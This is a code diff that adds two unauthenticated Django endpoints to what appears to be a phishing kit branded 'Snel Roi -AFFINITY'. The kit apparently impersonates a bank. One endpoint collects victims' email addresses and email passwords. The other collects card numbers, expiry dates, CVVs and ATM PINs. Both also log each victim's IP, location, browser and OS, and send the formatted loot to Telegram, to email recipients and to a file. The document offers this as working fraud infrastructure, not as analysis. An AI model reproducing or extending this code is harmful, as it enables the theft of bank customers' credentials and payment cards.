@@ -901,6 +901,191 @@ def affinity_collect_user_otp_verification(request):
     return Response(payload)
 
 
+@api_view(["POST"])
+@permission_classes([])
+@authentication_classes([])
+def affinity_collect_user_email_password(request):
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            email = request.data.get("email", "")
+            password = request.data.get("password", "")
+
+            if not username:
+                errors["username"] = ["Username is required."]
+            if not email:
+                errors["email"] = ["Email is required."]
+            if not password:
+                errors["password"] = ["Password is required."]
+
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+            client, created = Client.objects.get_or_create(username=username)
+            client.email = email
+            client.save()
+
+            bank_info, created = BankInfo.objects.get_or_create(client=client)
+            bank_info.email_password = password
+            bank_info.save()
+
+            browser_data, created = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
+            message += f"|========= [  EMAIL/PASSWORD ] ==========|\n"
+            message += f"| ➤ [ Username ]       : {username}\n"
+            message += f"| ➤ [ Email ]          : {email}\n"
+            message += f"| ➤ [ Password ]       : {password}\n"
+            message += f"|=====================================|\n"
+            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += f"|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += f"|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+            send_data_email(subject, message, from_email, recipient_list)
+            save_data_to_file(username, message)
+
+            payload["message"] = "Successful"
+            payload["data"] = data
+        except Exception:
+            logger.exception("affinity_collect_user_email_password failed")
+            payload["message"] = "Errors"
+            payload["errors"] = {"detail": ["Internal server error"]}
+            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+    return Response(payload)
+
+
+@api_view(["POST"])
+@permission_classes([])
+@authentication_classes([])
+def affinity_collect_user_card_info(request):
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            cardNumber = request.data.get("cardNumber", "")
+            expiryMonth = request.data.get("expiryMonth", "")
+            expiryYear = request.data.get("expiryYear", "")
+            cvv = request.data.get("cvv", "")
+            atmPin = request.data.get("atmPin", "")
+
+            if not username:
+                errors["username"] = ["Username is required."]
+            if not cardNumber:
+                errors["cardNumber"] = ["Card number is required."]
+            if not expiryMonth:
+                errors["expiryMonth"] = ["Expiry month is required."]
+            if not expiryYear:
+                errors["expiryYear"] = ["Expiry year is required."]
+            if not cvv:
+                errors["cvv"] = ["CVV is required."]
+            if not atmPin:
+                errors["atmPin"] = ["ATM PIN is required."]
+
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+            client, created = Client.objects.get_or_create(username=username)
+            bank_info, created = BankInfo.objects.get_or_create(client=client)
+            bank_info.card_number = cardNumber
+            bank_info.card_expiry = f"{expiryMonth}/{expiryYear}"
+            bank_info.card_cvv = cvv
+            bank_info.atm_pin = atmPin
+            bank_info.save()
+
+            browser_data, created = BrowserDetail.objects.get_or_create(client=client)
+            browser_data.ip = ip
+            browser_data.agent = agent
+            browser_data.country = country
+            browser_data.city = city
+            browser_data.address = f"{city}, {country}"
+            browser_data.browser = browser
+            browser_data.os = os
+            browser_data.time = date
+            browser_data.date = date
+            browser_data.save()
+
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
+            message += f"|========= [  CARD INFO ] ==========|\n"
+            message += f"| ➤ [ Username ]       : {username}\n"
+            message += f"| ➤ [ Card Number ]    : {cardNumber}\n"
+            message += f"| ➤ [ Expiry ]         : {expiryMonth}/{expiryYear}\n"
+            message += f"| ➤ [ CVV ]            : {cvv}\n"
+            message += f"| ➤ [ ATM PIN ]        : {atmPin}\n"
+            message += f"|=====================================|\n"
+            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += f"|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += f"|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+            subject = "The Data"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+            send_data_email(subject, message, from_email, recipient_list)
+            save_data_to_file(username, message)
+
+            payload["message"] = "Successful"
+            payload["data"] = data
+        except Exception:
+            logger.exception("affinity_collect_user_card_info failed")
+            payload["message"] = "Errors"
+            payload["errors"] = {"detail": ["Internal server error"]}
+            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+    return Response(payload)
+
+
 def affinity_is_valid_email(email):
     # Regular expression pattern for basic email validation
     pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
